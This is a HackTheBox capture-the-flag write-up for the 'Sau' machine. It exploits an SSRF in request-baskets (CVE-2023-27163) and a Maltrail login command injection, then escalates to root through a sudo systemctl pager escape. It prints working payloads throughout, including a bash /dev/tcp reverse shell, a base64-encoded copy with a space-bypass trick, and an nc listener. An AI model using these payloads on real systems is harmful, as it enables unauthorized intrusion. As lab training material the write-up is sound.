---
render_with_liquid: false
title: HackTheBox Writeup  Sau
date: 2023-07-12 17:40:24 +1400
tags: [hackthebox, linux, nmap, ssrf, cve-2023-27163, command-injection, white-space-bypass, sudo, systemctl, oscp-like-2023]
---




# Recon
---

## Nmap

**Quick port scan**

```bash
┌──(kali㉿kali)-[~/htb/sau]
└─$ sudo nmap -p- --min-rate 10000 -vv 10.129.14.235 --open
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63
```

**Full scan**

```bash

# Nmap 7.94 scan initiated Wed Jul 12 17:40:23 2023 as: nmap -sVC -p 22,55555 -T4 -Pn -vv -oA sua 10.129.14.235
Nmap scan report for 10.129.14.235
Host is up, received user-set (0.35s latency).
Scanned at 2023-07-12 17:40:24 CST for 113s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
55555/tcp open  unknown syn-ack ttl 63
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 12 Jul 2023 09:41:04 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 12 Jul 2023 09:40:31 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 12 Jul 2023 09:40:32 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=7/12%Time=64AE750F%P=x86_64-pc-linux-gnu%r(G
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Jul 12 17:42:17 2023 -- 1 IP address (1 host up) scanned in 114.44 seconds
```


## 55555 - Website


### Info

![](/assets/obsidian/fbcc61ba55d8a15ca962658615321189.png)

- Using  **[request-baskets](https://github.com/darklynx/request-baskets)** **Version**: `1.2.1`
- Go Lang Web Application


# User Flag
---

## request-baskets - SSRF (CVE-2023-27163)

Press create basket

![](/assets/obsidian/3629ad25ea8bf110d4ca92e3385ebb01.png)

Each buckets will be assigned a token in order to authenticate and manage

![](/assets/obsidian/29521e3363d6feebdb68fbc3bf479126.png)

- What **[request-baskets](https://github.com/darklynx/request-baskets)** do is : collect arbitrary HTTP requests and inspect them

Search for `request-baskets 1.2.1 exploit`

![](/assets/obsidian/67c361a973dd7a982fcea81dffc35622.png)

- Affected version is : `<=1.2.1`

Got SSRF CVE : [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

Search `CVE-2023-27163 poc`

> https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3

```bash
>
[Attack Vectors]
POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7
>
```

- Created a basket called `22`

- Went to the configuration settings and enabled `Proxy Response`

- Then set forward URL to `http://127.0.0.1:80` for the first try

![](/assets/obsidian/6c5b826c6eae1057918851ec619d7400.png)

Get response

```bash
curl http://10.129.14.235:55555/22
```

Port `80` is open and reveals the web application version info : `Maltrail 0.53`

![](/assets/obsidian/1e73ec2c8340db2bd4b02fac155dc009.png)


## Maltrail - Command Injection

Search `maltrail 0.53 exploit`

> https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

> Maltrail <= v0.54 is vulnerable to unauthenticated OS command injection during the login process.

**Poc:**

```bash
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```

Set the forward url to `http://127.0.0.1:80/login`

![](/assets/obsidian/3418eee9a158a72a326159f34f69e04c.png)

Then send a payload to ping back for testing

```bash
curl http://10.129.14.235:55555/22 --data-urlencode 'username=;$(ping 10.10.14.64)'
```

```bash
┌──(kali㉿kali)-[~/htb/sau]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:27:35.403107 IP 10.129.14.235 > kali: ICMP echo request, id 1, seq 213, length 64
21:27:35.403123 IP kali > 10.129.14.235: ICMP echo reply, id 1, seq 213, length 64
```

The reverse shell will not work without encoding

```bash
┌──(kali㉿kali)-[~/htb/sau]
└─$ curl http://10.129.14.235:55555/22 --data-urlencode 'username=;$(/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.64/80 0>&1")'
Login failed 
```

Encode first then decode on target and pipe to bash

```bash
┌──(kali㉿kali)-[~/htb/sau]
└─$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.64/80 0>&1"'|base64 -w0
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvODAgMD4mMSIK

┌──(kali㉿kali)-[~/htb/sau]
└─$ export PAYLOAD="echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvODAgMD4mMSIK|base64 -d|/bin/bash"
```

> Replace Spaces to bypass for some cases
> ```
> echo 'echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvODAgMD4mMSIK|base64 -d|/bin/bash' | sed 's/ /${IFS}/g'
> ```
{: .prompt-tip }

```bash
┌──(kali㉿kali)-[~/htb/sau]
└─$ curl http://10.129.14.235:55555/22 --data-urlencode 'username=;$(${PAYLOAD})'
```

```bash
┌──(kali㉿kali)-[~/htb/sau]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.64] from (UNKNOWN) [10.129.14.235] 50652
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
puma@sau:/opt/maltrail$ cat /home/puma/user.txt
cat /home/puma/user.txt
65f4c3d3126f46a99c3b0e509f1bafc8
```


# Root Flag
---

## Sudo

Stabilize the shell

```bash
puma@sau:/opt/maltrail$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
puma@sau:/opt/maltrail$ ^Z
zsh: suspended  nc -lvnp 80

┌──(kali㉿kali)-[~/htb/sau]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 80

puma@sau:/opt/maltrail$
```

```bash
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

GTFOBIN - https://gtfobins.github.io/gtfobins/systemctl/

Just enter `!sh` in interactive session after executing the `systemclt status` command

```bash
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
f1a680d92c836e650766219ffef801a8
```


# Additional
---


## Web Enumeration


### Search Security Flaws From Github Release

After finding the repo's [release](https://github.com/darklynx/request-baskets/releases) page for version release info after `1.2.1`, but no security fixes found, try to find another way

Try command injection

![](/assets/obsidian/436833ae09278020992a84e50272c657.png)

Got the regex: `^[\w\d\-_\.]{1,250}$`

There's a page to enter master token and gain access to all baskets

![](/assets/obsidian/a55791d87d501ce244b3644b0685ba18.png)


### Check authentication token 

But according to the function generating token in the source code at version `1.2.1`, it is nearly impossible to brute force

![](/assets/obsidian/21d806a8a10ad13798278221651a04e1.png)
